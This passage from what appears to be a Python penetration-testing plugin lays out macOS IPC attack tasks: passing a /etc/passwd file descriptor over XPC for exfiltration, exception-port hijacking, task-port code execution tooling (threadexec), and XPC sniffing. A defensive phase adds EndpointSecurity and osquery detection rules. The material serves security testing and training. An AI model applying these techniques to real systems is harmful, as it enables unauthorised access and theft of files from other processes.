Encapsulate file descriptors as Mach port rights
Allow FD sharing between processes via IPC

API Functions:
--------------
fileport_makeport(fd, &fileport)  // FD -> Mach port
fileport_makefd(&fd, fileport)    // Mach port -> FD

Use Cases:
----------
- Share file handles between processes
- Transfer open sockets via XPC
- Bypass file access restrictions
- Exfiltrate file contents through IPC

Example (XPC):
--------------
// Sender
int fd = open("/etc/passwd", O_RDONLY);
mach_port_t fileport;
fileport_makeport(fd, &fileport);

xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_mach_send(msg, "fd", fileport);
xpc_connection_send_message(conn, msg);

// Receiver
xpc_object_t msg = event;
mach_port_t fileport = xpc_dictionary_copy_mach_send(msg, "fd");
int fd;
fileport_makefd(&fd, fileport);
// Now have FD to /etc/passwd in different process

Security Note:
--------------
File ports don't bypass file permissions - still need
read/write access when creating fileport
''',
                'success_indicators': [
                    'File descriptor successfully transferred',
                    'Receiver can read/write file',
                    'No permission errors'
                ],
                'failure_indicators': [
                    'fileport_makeport fails - permission denied',
                    'fileport_makefd fails - invalid port'
                ],
                'next_steps': [
                    'Chain with XPC exploitation',
                    'Transfer privileged file handles',
                    'Exfiltrate sensitive files via IPC'
                ]
            }
        })

        # Task 6.2: Exception port hijacking
        advanced_techniques['children'].append({
            'id': 'exception-port-hijack',
            'name': 'Exception Port Hijacking',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Code required',
                'description': 'Intercept crashes and exceptions by hijacking exception ports',
                'tags': ['OSCP:LOW', 'ADVANCED', 'MACOS'],
                'notes': '''
Exception Triage in macOS:
---------------------------
Thread exception -> Task exception -> Host exception (launchd)

Exception Port Levels:
----------------------
1. Thread: thread_set_exception_ports()
2. Task: task_set_exception_ports()
3. Host: host_set_exception_ports() (requires host_priv_port)

Attack Scenarios:
-----------------
1. Intercept crashes in target process
2. Modify exception handler (e.g., prevent crash reports)
3. Inject code during exception handling
4. Steal data from crashed process

Example:
--------
// Set exception handler for target thread
mach_port_t exception_port;
mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_port);

thread_set_exception_ports(
    target_thread,
    EXC_MASK_ALL,
    exception_port,
    EXCEPTION_DEFAULT,
    THREAD_STATE_NONE
);

// Wait for exceptions
mach_msg_header_t msg;
mach_msg(&msg, MACH_RCV_MSG, 0, sizeof(msg), exception_port, ...);

Security Note:
--------------
Crash reporting tools (PLCrashReporter) use this technique
Host exception port requires root + host_priv access
''',
                'success_indicators': [
                    'Exception port registered',
                    'Exceptions intercepted',
                    'Handler executed on crash'
                ],
                'failure_indicators': [
                    'thread_set_exception_ports fails - no permissions',
                    'host_set_exception_ports requires host_priv_port'
                ],
                'next_steps': [
                    'Modify exception handler behavior',
                    'Extract crash information',
                    'Prevent crash reporting'
                ]
            }
        })

        # Task 6.3: Remote XPC
        advanced_techniques['children'].append({
            'id': 'remote-xpc',
            'name': 'Remote XPC Analysis',
            'type': 'command',
            'metadata': {
                'command': f'/usr/libexec/remotectl list',
                'description': 'Enumerate remote XPC services (BridgeOS communication)',
                'tags': ['OSCP:LOW', 'ENUM', 'MACOS', 'ADVANCED'],
                'flag_explanations': {
                    'remotectl': 'Tool for remote XPC service management',
                    'list': 'Show available bridge devices and services'
                },
                'success_indicators': [
                    'Bridge devices listed',
                    'Remote XPC services enumerated',
                    'IPv6 interfaces shown'
                ],
                'failure_indicators': [
                    'No bridge devices found',
                    'Tool not available on system'
                ],
                'next_steps': [
                    'remotectl show <device>  # Get device properties',
                    'remotectl netcat <service>  # Expose service on port',
                    'Monitor traffic: netstat, nettop, netbottom',
                    'Analyze RemoteXPC.framework for exploitation'
                ],
                'alternatives': [
                    'remotectl dumpstate  # Full service dump',
                    'Check /System/Library/LaunchDaemons for UsesRemoteXPC key',
                    'netstat -an | grep -i ipv6  # Find remote connections'
                ],
                'notes': 'Remote XPC allows IPC between macOS and BridgeOS (T2 chip). Communication over dedicated IPv6 interface. High-value target for T2 exploitation.'
            }
        })

        tasks['children'].append(advanced_techniques)

        # ============================================================
        # PHASE 7: Detection & Forensics
        # ============================================================
        detection_tasks = {
            'id': 'ipc-detection',
            'name': 'IPC Attack Detection & Forensics',
            'type': 'parent',
            'children': []
        }

        # Task 7.1: Monitor with EndpointSecurity
        detection_tasks['children'].append({
            'id': 'endpoint-security-monitor',
            'name': 'Monitor IPC with EndpointSecurity Framework',
            'type': 'manual',
            'metadata': {
                'command': 'N/A - Swift code required',
                'description': 'Detect task port access and thread injection using ES framework',
                'tags': ['OSCP:LOW', 'DETECTION', 'MACOS', 'BLUE_TEAM'],
                'notes': '''
EndpointSecurity Events for IPC:
---------------------------------
ES_EVENT_TYPE_AUTH_GET_TASK: Fired on task_for_pid()
ES_EVENT_TYPE_NOTIFY_REMOTE_THREAD_CREATE: Remote thread creation
ES_EVENT_TYPE_NOTIFY_THREAD_SET_STATE: Register manipulation (macOS 14+)

Swift Client Example:
---------------------
import EndpointSecurity

let client = try ESClient(subscriptions: [
    .authGetTask,
    .notifyRemoteThreadCreate,
    .notifyThreadSetState
]) { (_, msg) in
    switch msg.event {
    case .authGetTask(let evt):
        print("task_for_pid: target=\\(evt.target.pid) by \\(evt.instigator.pid)")
    case .notifyRemoteThreadCreate(let evt):
        print("[ALERT] Remote thread in pid \\(evt.target.pid)")
    default:
        break
    }
}
RunLoop.main.run()

osquery Detection:
------------------
SELECT target_pid, source_pid, target_path
FROM es_process_events
WHERE event_type = 'REMOTE_THREAD_CREATE';

Detection Rules:
----------------
- task_for_pid on system processes
- Unexpected remote thread creation
- Register manipulation outside debuggers
- Multiple task port access attempts (enum)
''',
                'success_indicators': [
                    'EndpointSecurity client running',
                    'IPC events logged',
                    'Suspicious activity detected'
                ],
                'failure_indicators': [
                    'ES entitlement required',
                    'SIP prevents ES on some processes'
                ],
                'next_steps': [
                    'Correlate events with process lineage',
                    'Block suspicious task_for_pid calls',
                    'Alert on injection attempts'
                ]
            }
        })

        # Task 7.2: Trace XPC with kdebug
        detection_tasks['children'].append({
            'id': 'xpc-kdebug-trace',
            'name': 'Trace XPC with kdebug',
            'type': 'command',
            'metadata': {
                'command': f'sudo trace -f xpc',
                'description': 'Trace XPC operations using kernel debug tracing',
                'tags': ['OSCP:LOW', 'DETECTION', 'MACOS'],
                'flag_explanations': {
                    'trace': 'System call tracer using kdebug',
                    '-f': 'Filter by subsystem',
                    'xpc': 'XPC subsystem events'
                },
                'success_indicators': [
                    'XPC operations logged',
                    'Message IDs visible',
                    'Connection events traced'
                ],
                'failure_indicators': [
                    'Permission denied (need root)',
                    'kdebug not enabled'
                ],
                'next_steps': [
                    'Parse trace output for anomalies',
                    'Identify suspicious XPC connections',
                    'Correlate with process creation events'
                ],
                'alternatives': [
                    'kdv all | grep MIG  # MIG-specific tracing',
                    'sudo dtruss -p <PID>  # DTrace system call tracing',
                    'fs_usage -w -f filesys <PID>  # File system tracing'
                ],
                'notes': 'XPC uses kdebug codes 0x29* (xpc library) and 0x22* (xpcproxy). Requires root. Add custom codes to /usr/share/misc/trace.codes for parsing.'
            }
        })

        tasks['children'].append(detection_tasks)

        # ============================================================
        # PHASE 8: Exploitation Tools
        # ============================================================
        tools_tasks = {
            'id': 'ipc-tools',
            'name': 'IPC Exploitation Tools',
            'type': 'parent',
            'children': []
        }

        # Task 8.1: threadexec library
        tools_tasks['children'].append({
            'id': 'threadexec-install',
            'name': 'Install threadexec Library',
            'type': 'command',
            'metadata': {
                'command': f'git clone https://github.com/bazad/threadexec && cd threadexec && make',
                'description': 'Install Brandon Azad\'s threadexec library for task port exploitation',
                'tags': ['OSCP:MEDIUM', 'TOOL_SETUP', 'MACOS'],
                'flag_explanations': {
                    'threadexec': 'Library for arbitrary code execution via task ports',
                    'make': 'Compile library and examples'
                },
                'success_indicators': [
                    'Library compiled successfully',
                    'Example binaries created',
                    'Headers available for linking'
                ],
                'failure_indicators': [
                    'Compilation errors',
                    'Missing dependencies'
                ],
                'next_steps': [
                    'Link threadexec in exploit: -L./threadexec -lthreadexec',
                    'Use threadexec_call() for remote function calls',
                    'Implement shared memory back-channel',
                    'Transfer Mach ports between processes'
                ],
                'alternatives': [
                    'Manual implementation using task port primitives',
                    'Use dylib injection instead'
                ],
                'notes': 'threadexec provides high-level API for task port exploitation: arbitrary RPC, memory R/W, Mach port transfer. Works on Intel and Apple Silicon.'
            }
        })

        # Task 8.2: Install xpcspy
        tools_tasks['children'].append({
            'id': 'xpcspy-install',
            'name': 'Install xpcspy',
            'type': 'command',
            'metadata': {
                'command': f'pip3 install xpcspy --no-deps',
                'description': 'Install Frida-based XPC message sniffer',
                'tags': ['OSCP:MEDIUM', 'TOOL_SETUP', 'MACOS'],
                'flag_explanations': {
                    'pip3': 'Python package manager',
                    'xpcspy': 'XPC interception tool',
                    '--no-deps': 'Avoid downgrading existing Frida installation'
                },
                'success_indicators': [
                    'xpcspy installed successfully',
                    'Command available: xpcspy --help'
                ],
                'failure_indicators': [
                    'pip3 not found',
                    'Frida compatibility issues'
                ],
                'next_steps': [
                    'Start sniffing: xpcspy -U -r -W <bundle-id>',
                    'Use filters: xpcspy -U <app> -t "i:com.apple.*"',
                    'Analyze captured messages for exploitation'
                ],
                'alternatives': [
                    'XPoCe2: http://newosxbook.com/tools/XPoCe2.html',
                    'Custom Frida script for XPC hooking',
                    'DTrace-based XPC tracing'
                ],
                'notes': 'Requires SIP disabled or target app with get-task-allow entitlement. Use with Debug builds for full visibility.'
            }
        })

        # Task 8.3: Install jtool2
        tools_tasks['children'].append({
            'id': 'jtool2-install',
            'name': 'Install jtool2',
            'type': 'command',
            'metadata': {
                'command': f'curl -o jtool2.tgz http://www.newosxbook.com/tools/jtool2.tgz && tar xzvf jtool2.tgz',
                'description': 'Install Jonathan Levin\'s jtool2 for Mach-O analysis',
                'tags': ['OSCP:MEDIUM', 'TOOL_SETUP', 'MACOS'],
                'flag_explanations': {
                    'jtool2': 'Advanced Mach-O binary analysis tool',
                    'curl -o': 'Download file',
                    'tar xzvf': 'Extract tarball'
                },
                'success_indicators': [
                    'jtool2 binary extracted',
                    'Tool runs: ./jtool2 --help'
                ],
                'failure_indicators': [
                    'Download failed',
                    'Architecture mismatch'
                ],
                'next_steps': [
                    'Analyze MIG dispatch tables: jtool2 -d __DATA.__const <binary>',
                    'Check for MIG usage: jtool2 -S <binary> | grep NDR',
                    'Dump segments: jtool2 -l <binary>'
                ],
                'alternatives': [
                    'otool (built-in): otool -tV <binary>',
                    'MachOView GUI: https://sourceforge.net/projects/machoview/',
                    'Hopper Disassembler (commercial)'
                ],
                'notes': 'jtool2 is essential for MIG analysis and Mach-O reverse engineering. Free alternative to IDA Pro for macOS binaries.'
            }
        })

        tasks['children'].append(tools_tasks)

        return tasks


# Register plugin
__all__ = ['MacOSIPCPlugin']
